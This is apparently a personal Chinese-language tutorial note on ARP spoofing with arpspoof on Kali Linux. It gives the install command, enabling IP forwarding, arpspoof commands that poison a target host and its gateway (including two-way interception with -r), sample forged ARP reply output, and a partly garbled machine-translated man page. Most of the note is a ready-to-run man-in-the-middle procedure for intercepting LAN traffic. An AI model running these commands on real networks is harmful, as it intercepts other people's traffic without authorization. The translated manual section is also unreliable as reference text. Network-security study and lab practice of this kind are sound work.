kali安装arpspoof

```shell
 sudo apt-get install dsniff
```

在使用arpspoof前先开启Kali的IP转发（如果不开起被欺骗主机将会断网），使用命令：

```shell
echo 1 > /proc/sys/net/ipv4/ip_forward
```

-t 参数后的第一个IP地址是被欺骗的主机，第二个IP地址是你要伪装成的主机，如：

```shell
arpspoof  -i eth0 -t 192.168.205.200 192.168.205.2
```

攻击前攻击主机与被攻击主机ip及mac地址：

攻击机：192.168.205.173	00:0c:29:b9:87:9b

被攻击机：192.168.205.200	0:c:29:d9:67:c2

攻击后：

192.168.205.173 已被伪装成192.168.205.2  下图中mac地址已被欺骗成192.168.205.173的mac地址**00:0c:29:b9:87:9b**

之后与192.168.205.2通信的主机数据包都被截获![image-20210520144620092](C:\Users\15507\AppData\Roaming\Typora\typora-user-images\image-20210520144620092.png)

执行以下命令，会欺骗两个主机（被欺骗主机与被伪装主机），发送的伪造ARP响应包如下：

```shell
arpspoof -i eth1 -t 192.168.56.101 192.168.56.102 -r
```

下面两条命令是等效的。执行以下命令，会欺骗两个主机，发送的伪造ARP响应包如下：

```shell
    8:0:27:35:8e:19 8:0:27:31:bf:15 0806 42: arp reply 192.168.56.102 is-at 8:0:27:35:8e:19
    8:0:27:35:8e:19 8:0:27:84:9a:41 0806 42: arp reply 192.168.56.101 is-at 8:0:27:35:8e:19
    8:0:27:35:8e:19 8:0:27:31:bf:15 0806 42: arp reply 192.168.56.102 is-at 8:0:27:35:8e:19
    8:0:27:35:8e:19 8:0:27:84:9a:41 0806 42: arp reply 192.168.56.101 is-at 8:0:27:35:8e:19
    8:0:27:35:8e:19 8:0:27:31:bf:15 0806 42: arp reply 192.168.56.102 is-at 8:0:27:35:8e:19
    8:0:27:35:8e:19 8:0:27:84:9a:41 0806 42: arp reply 192.168.56.101 is-at 8:0:27:35:8e:19
```

***-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------***

名称
       arpspoof-在交换式LAN上拦截数据包

概要
       arpspoof [-i接口] [-c拥有|主机|两者] [-t目标] [-r]主机

描述
       arpspoof通过伪造ARP响应重定向来自局域网中目标主机（或所有主机）的数据包，这些数据包打算用于局域网中的另一主机。这是嗅探网络上流量的一种非常有效的方法
       转变。

       必须提前打开内核IP转发（或完成此操作的用户级程序，例如fragrouter（8））。

选项
       -i接口
              指定要使用的接口。

```
   -c自己|主机|两者
          指定恢复arp配置时使用的硬件地址；清理时，可以使用自己的地址以及主机的地址发送数据包。发送包
          具有虚假硬件地址的ets可能会中断与某些交换机/ ap /网桥配置的连接，但是它比使用自己的地址更可靠地工作，这是arp-的默认方式
          恶搞之后清理。

   -t目标
          为ARP毒药指定一个特定的主机（如果未指定，则为LAN上的所有主机）。重复指定多个主机。

   -r毒害两个主机（主机和目标）以捕获双向流量。 （仅与-t结合使用时有效）

   host指定您希望拦截其数据包的主机（通常是本地网关）。
```

